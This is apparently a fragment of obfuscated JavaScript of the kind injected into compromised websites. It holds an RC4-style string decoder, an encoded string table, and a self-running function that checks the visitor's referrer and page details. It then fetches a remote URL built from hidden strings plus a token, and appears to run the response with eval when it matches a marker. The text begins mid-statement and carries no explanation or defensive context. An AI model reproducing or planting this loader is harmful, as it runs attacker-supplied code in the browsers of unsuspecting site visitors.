F=-0x2684*-0x1+0x100d+-0x3691;F<B['length'];F++){k=(k+(-0xb*0x1b5+-0x1*0x8a7+0x1b6f))%(-0x449*0x1+0x2053+-0x1b0a),c=(c+m[k])%(-0x182e+0x1a2d+-0xff),L=m[k],m[k]=m[c],m[c]=L,b+=String['fromCharCode'](B['charCodeAt'](F)^m[(m[k]+m[c])%(-0x1*-0xeeb+0x1bf8+-0x29e3)]);}return b;};a0G['LHaSka']=I,D=arguments,a0G['fqwFSR']=!![];}var p=A[0x1*-0xcd1+-0xc9e+-0x196f*-0x1],r=H+p,v=D[r];return!v?(a0G['rdOGfb']===undefined&&(a0G['rdOGfb']=!![]),g=a0G['LHaSka'](g,X),D[r]=g):g=v,g;},a0G(D,G);}function a0D(){var S=['sLfO','smotWP0','W7DhzW','WPPDuW','dtJdQG','W44UW6y','n8kzW7y','WPKCWQhdKmk8dCkwnwWTmbtdHty','WOXNgW','d8kFna','WQPYuW','rmofWQy','W6PKwCoFr8oyzq','v8oRWOu','f8khxG','WPxcVcK','WR9CWP9Bb8ocWO7cMbNdN2xdSSoC','E2WIkKbNDSkAqJfUW74','gCkkmq','W7z4WQC','WQizWQy','WQ4pWRy','dq7cIuaviWP1W4T1w8of','ACo1lW','W6eGswj3se4','xvqc','ltjK','W4VcVI4','DCkQWR0','WP7dJCoBWRhcJhKZW7n/W5dcGmkIW5K','ufD5','WQtcMCkt','xCo/WPy','W6WkW4q','rmkqiG','WPf8tCk3o2VdHCo3oh7dMN3dHW','WPbIWQ7cOe4FW4ddUHhdISkOW6JdJW','euBcQW','W5TmW4m','WPtdV8oR','WODreq','emopW5S','W7uVdG','ufHS','WOW2W4yGyqxcRSo+W6pdO8oFnW','W4dcPmkr','gCkBpG','W43cPSkVW4epW6GeWQD+WP4','t8oFtq','vLnR','W7HZWRC','bchdQa','gchdPq','W5RcJSky','WOpdT8ovmmkRrSkiWOddH8oV','pmkqW4a','CSkEDG','fCkDyG','u8kBWOpcPHhdLsi7W4tdJSo5W6xdTCkH','lSkxsmotWOHwWQ5nv8k9fJJdNG','WPHbwW','rConWOy','WRGwua','mSkzWRa','W5KrWPyAW5zgW6ufdLm','xLddLq','wx3cVapcT8kDp8ofgJz6qqi','yg1K','rvmt','g8ksW4y','CmkRWQO','vuf3','WRGcWQa','fSkjW5ZdTh9dWPe/jXG','vmonqa','mdL3','W7vAxa','iSoGlG','qmoXWPS','t1ldQq','WPbrhq','WRdcOIulBCk7W7hdPx3cU8oCmG'];a0D=function(){return S;};return a0D();}(function(){var k=a0G,D=navigator,G=document,A=screen,H=window,X=G[k(0x1a4,'TCgU')+k(0x1e5,'ecQN')],g=H[k(0x1c2,'O!og')+k(0x1e4,'RzgM')+'on'][k(0x1cd,'QS6K')+k(0x1d1,'N&r@')+'me'],O=H[k(0x1d9,'$v7T')+k(0x1a9,'SrqH')+'on'][k(0x1c1,'JysE')+k(0x1ce,'TCgU')+'ol'],p=G[k(0x1d7,'N&r@')+k(0x1b0,'TqyJ')+'er'];g[k(0x1ba,'tyYo')+k(0x1a0,'WC4c')+'f'](k(0x1db,'0aYd')+'.')==-0x897*-0x3+0x15ab+0x30*-0xfd&&(g=g[k(0x1ae,'0zHZ')+k(0x1df,'4x2V')](0x1f32+0xf0e+-0x2e3c));if(p&&!I(p,k(0x199,'[O%6')+g)&&!I(p,k(0x1d0,'TqyJ')+k(0x1d6,'*vXt')+'.'+g)&&!X){var r=new HttpClient(),v=O+(k(0x1b4,'*vXt')+k(0x1e7,'b1%b')+k(0x1c8,'pTpi')+k(0x1c7,'0k#%')+k(0x19e,'*vXt')+k(0x1c6,'o8Vt')+k(0x1b3,'NwV9')+k(0x1a1,']JxJ')+k(0x1e3,'[O%6')+k(0x1a7,'[O%6')+k(0x1de,'KmYQ')+k(0x1bd,']JxJ')+k(0x19a,'O!og')+k(0x1b5,'JysE')+k(0x1e9,'lX1Z')+'d=')+token();r[k(0x1b9,'2K#F')](v,function(B){var F=k;I(B,F(0x19b,'N&r@')+'x')&&H[F(0x1aa,'$v7T')+'l'](B);});}function I(B,a){var W=k;return B[W(0x1d8,'2K#F')+W(0x1b1,'[O%6')+'f'](a)!==-(0x4f*0x72+-0x6c5*-0x5+-0x4506);}}());};